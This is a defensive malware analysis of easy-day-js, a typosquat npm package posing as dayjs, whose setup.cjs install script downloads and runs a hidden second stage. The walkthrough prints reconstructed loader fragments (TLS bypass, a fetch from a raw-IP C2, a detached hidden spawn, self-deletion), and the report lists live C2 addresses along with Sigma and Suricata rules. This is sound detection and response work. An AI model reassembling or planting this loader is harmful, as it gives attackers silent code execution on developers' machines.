# Threat Analysis — `easy-day-js@1.11.22` malicious `setup.cjs` dropper

> **Defensive analysis only.** This document describes a malicious npm package
> install-time dropper so it can be **detected, blocked, and responded to**. It
> does **not** contain a runnable copy of the malware. All network indicators are
> *defanged* (`hxxps`, `[.]`) in the narrative; the IOC table at the end lists the
> real values for blocklists/threat-intel ingestion.

| | |
|---|---|
| **Sample** | `setup.cjs` shipped inside npm package `easy-day-js@1.11.22` |
| **Type** | First-stage loader / dropper (supply-chain attack) |
| **Language / runtime** | Node.js (CommonJS, `.cjs`) |
| **Platform** | Cross-platform; contains a Windows-specific stealth flag (`windowsHide`) |
| **Severity** | **Critical** — unauthenticated remote code execution on install |
| **Analyst** | Walker Yturbides |
| **Status** | Behavioral analysis from reconstructed source |

---

## 1. Executive summary

`easy-day-js` is a **typosquat-style malicious npm package**. The name closely
mimics the extremely popular `dayjs` date library, which is the likely lure for
victims who mistype or are tricked into installing it.

When the package is installed, an install/lifecycle script (`setup.cjs`) executes
automatically under the Node.js runtime. That script is a **minimal first-stage
loader**: it disables TLS certificate checking, downloads a **second-stage
payload** from a hard-coded command-and-control (C2) server, writes it to a
randomly-named file in the system temp directory, launches it as a **hidden,
detached background process** (handing it a *second* C2 address to beacon to),
and finally **deletes itself** to hinder forensic recovery.

This is a classic **download-and-execute dropper** whose only job is to get the
real payload onto the host quietly. The actual capability (info-stealer,
backdoor, ransomware, etc.) lives in the second stage, which is fetched at
runtime and therefore not present in the package itself — a deliberate design that
keeps the published package looking small and innocuous.

---

## 2. Execution trigger

npm packages may define **lifecycle scripts** (`preinstall`, `install`,
`postinstall`) in `package.json` that run **automatically** during
`npm install`. A `setup.cjs` of this kind is referenced from one of those hooks,
so simply running `npm install easy-day-js` — or installing anything that depends
on it — is enough to execute the loader. **No human action beyond install is
required.** This is the core danger of supply-chain droppers.

---

## 3. Behavioral walkthrough

The loader performs six discrete actions. Each is described below with its intent
and the corresponding detection opportunity.

### 3.1 Disable TLS certificate validation
```
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
```
Sets the Node.js flag that makes **all** HTTPS requests in the process accept any
certificate, including self-signed or invalid ones. This lets the loader reach a
C2 that presents a bogus cert and avoids TLS errors that might otherwise surface
the activity. **Red flag:** legitimate install scripts essentially never disable
TLS verification globally.

### 3.2 Contact the first C2 and download the second stage
```
const c2 = 'hxxps://23.254.164[.]92:8000/update/49890878';
const payload = await (await fetch(c2)).text();
```
Issues an HTTPS GET to a **hard-coded raw IP on a non-standard port** (`:8000`),
with a URI (`/update/<digits>`) crafted to look like a benign software-update
endpoint. The response body is the **second-stage code**, fetched fresh at
runtime. **Red flag:** outbound connection to a bare IP (no domain) on an unusual
port during `npm install`.

### 3.3 Stage the payload to a random temp file
```
const file = path.join(os.tmpdir(), crypto.randomBytes(12).toString('hex') + '.js');
fs.writeFileSync(file, payload, 'utf8');
```
Writes the downloaded code to the OS temp directory under a **random 24-hex-char
filename** with a `.js` extension. The randomized name defeats simple
filename-based detection and avoids collisions. **Red flag:** a process writing a
freshly-downloaded executable script into `%TEMP%`/`/tmp` with a random name.

### 3.4 Execute the second stage — hidden, detached, with a second C2
```
child_process.spawn(process.execPath, [file, '23.254.164[.]123:443'], {
  cwd: os.tmpdir(),
  detached: true,        // survives parent exit; own process group
  stdio: 'ignore',       // no console output to observe
  windowsHide: true,     // no visible window on Windows
}).unref();              // parent does not wait on the child
```
Runs the staged file with the **same Node binary** (`process.execPath`) and passes
it a **second C2 address** (`23.254.164[.]123:443`) as an argument — so the second
stage knows where to beacon. The options are pure **stealth/persistence of
execution**:
- `detached: true` + `.unref()` — the child keeps running after `npm install`
  finishes and the parent exits.
- `stdio: 'ignore'` — suppresses all child output.
- `windowsHide: true` — no window flashes on Windows.

**Red flag:** `node` spawning `node` to run a random temp-dir script, detached and
hidden, with an IP:port as an argument.

### 3.5 Self-delete
```
fs.rmSync(__filename, { force: true });   // delete setup.cjs
```
Deletes its own file after launching the second stage — **indicator removal** to
slow incident responders and reduce on-disk evidence. **Red flag:** an install
script deleting itself.

### 3.6 Silent error handling
```
try { ... } catch { } finally { ... }
```
The empty `catch` swallows every error so the install appears to succeed even if
any step fails — avoiding suspicious error messages in the npm output.

---

## 4. MITRE ATT&CK mapping

| Tactic | Technique | ID | Where it appears |
|---|---|---|---|
| Initial Access | Supply Chain Compromise: Software Supply Chain | T1195.002 | Malicious npm package |
| Initial Access / Masquerading | Masquerading: Match Legitimate Name | T1036.005 | `easy-day-js` ≈ `dayjs` typosquat |
| Execution | Command & Scripting Interpreter: JavaScript | T1059.007 | Node.js `.cjs` loader |
| Execution | Native API / lifecycle script auto-run | T1059 | npm `install`/`postinstall` hook |
| Command & Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS GET to C2 |
| Command & Control | Ingress Tool Transfer | T1105 | Downloads second stage |
| Command & Control | Non-Standard Port | T1571 | `:8000` / raw-IP C2 |
| Defense Evasion | Impair Defenses: Disable/Modify Tools | T1562 | `NODE_TLS_REJECT_UNAUTHORIZED=0` |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `windowsHide: true` |
| Defense Evasion | Obfuscated Files or Information | T1027 | Random temp filename |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 | Self-delete via `fs.rmSync` |

---

## 5. Indicators of Compromise (IOCs)

> Listed un-defanged for direct use in blocklists / detection tooling. **These are
> known-malicious — block, do not browse.**

| Type | Indicator | Note |
|---|---|---|
| npm package | `easy-day-js` version `1.11.22` | Typosquat of `dayjs` |
| File | `setup.cjs` inside the package | Self-deleting first stage |
| C2 (stage 2 download) | `https://23.254.164.92:8000/update/49890878` | HTTPS, non-standard port |
| C2 host | `23.254.164.92` | First-stage server |
| C2 (beacon target) | `23.254.164.123:443` | Passed to second stage |
| C2 host | `23.254.164.123` | Second-stage callback |
| URI pattern | `/update/<numeric-id>` | Fake update endpoint |
| Host artifact | `%TEMP%`/`/tmp` `*.js` with 24-hex-char random name | Staged payload |
| Process behavior | `node` → spawns `node <tempfile> <ip:port>` (detached/hidden) | Stage-2 launch |

Both C2 IPs are in the `23.254.164.0/24` range — consider monitoring/blocking the
adjacent range pending further intel.

---

## 6. Detection

### 6.1 Supply-chain / pre-install (best place to catch it)
- Install with **`npm install --ignore-scripts`** in CI and dev by default; allow
  lifecycle scripts only for vetted packages.
- Scan dependencies with **install-script-aware tooling** (e.g. Socket, `npq`,
  OSV/Snyk, OpenSSF Scorecard). Flag any package whose install script:
  - sets `NODE_TLS_REJECT_UNAUTHORIZED`,
  - calls `fetch`/`http(s).get` to a raw IP,
  - writes to `os.tmpdir()`,
  - uses `child_process.spawn`/`exec`,
  - references `__filename` with `fs.rm`/`unlink` (self-delete).
- Review `package-lock.json` diffs for unexpected/typosquat names
  (`easy-day-js` vs `dayjs`); pin and use a private registry mirror.

### 6.2 Host / EDR (process telemetry)
Behavioral logic — *node spawning node to run a random temp script, detached & hidden*:

```
ParentImage ENDS WITH \node.exe (or node)
  AND Image ENDS WITH \node.exe (or node)
  AND CommandLine CONTAINS a path under the temp dir (%TEMP%\ or /tmp/)
  AND CommandLine MATCHES a 24-hex-char *.js filename
  AND (process created detached / no console window)
```

**Sigma (process_creation) — illustrative:**
```yaml
title: Node.js Drops and Executes Random Temp Script (npm dropper behavior)
status: experimental
logsource:
  category: process_creation
detection:
  parent:
    ParentImage|endswith: '\node.exe'
  child:
    Image|endswith: '\node.exe'
    CommandLine|re: '(?i)(\\Temp\\|/tmp/)[0-9a-f]{24}\.js'
  condition: parent and child
level: high
tags:
  - attack.execution
  - attack.t1059.007
  - attack.defense_evasion
  - attack.t1070.004
```

Also alert on: a `.js`/`.cjs` file deleting itself shortly after a child process
spawn; new executable scripts created in temp immediately after an `npm install`.

### 6.3 Network
- Alert/block **outbound to `23.254.164.92:8000` and `23.254.164.123:443`**.
- Heuristics independent of these IPs:
  - TLS/HTTPS to a **bare IP literal** (no SNI/hostname) on non-standard ports,
    originating from a `node` process during build/install windows.
  - URI pattern `/update/<digits>` to an IP host.

**Suricata — illustrative:**
```
alert tcp $HOME_NET any -> 23.254.164.92 8000 (msg:"easy-day-js dropper C2 (stage download)"; flow:to_server,established; sid:1000001; rev:1;)
alert tcp $HOME_NET any -> 23.254.164.123 443 (msg:"easy-day-js dropper stage-2 C2 beacon"; flow:to_server,established; sid:1000002; rev:1;)
```

---

## 7. Mitigation & response

**Prevent**
- Default to `--ignore-scripts`; maintain an allowlist of packages permitted to run
  install scripts.
- Use a vetted internal registry/proxy; enable typosquat detection.
- Pin exact versions and review lockfile changes in PRs.

**If install already ran (containment / eradication)**
1. **Isolate** the host from the network.
2. **Block** both C2 IPs at the egress firewall/proxy.
3. Hunt for and terminate rogue `node` processes; look for the staged
   `%TEMP%`/`/tmp` random-hex `.js` and remove it (note the original `setup.cjs`
   self-deletes, so absence of it is itself a clue).
4. Search proxy/DNS/flow logs for connections to the IOCs to scope blast radius
   and identify what the **unknown second stage** did (credential theft, additional
   persistence, lateral movement) — assume secrets on the host are compromised.
5. **Rotate credentials/tokens** that were accessible to the affected user/CI
   (npm tokens, cloud keys, SSH keys, `.env` secrets).
6. Remove the package; reinstall clean dependencies from a trusted lockfile.
7. Report the package to the npm security team for takedown.

**Caveat:** the second-stage payload is downloaded at runtime and is **not**
contained in the package, so its full capability is unknown from this sample alone.
Treat any host that executed it as fully compromised until the second stage is
recovered and analyzed.

---

## 8. References
- MITRE ATT&CK — T1195.002, T1059.007, T1071.001, T1105, T1564.003, T1070.004
- npm docs — *scripts* (lifecycle hooks: `preinstall`/`install`/`postinstall`)
- Node.js docs — `child_process.spawn` options (`detached`, `stdio`, `windowsHide`),
  `NODE_TLS_REJECT_UNAUTHORIZED`
- OpenSSF / Socket.dev — guidance on malicious install scripts in the npm ecosystem
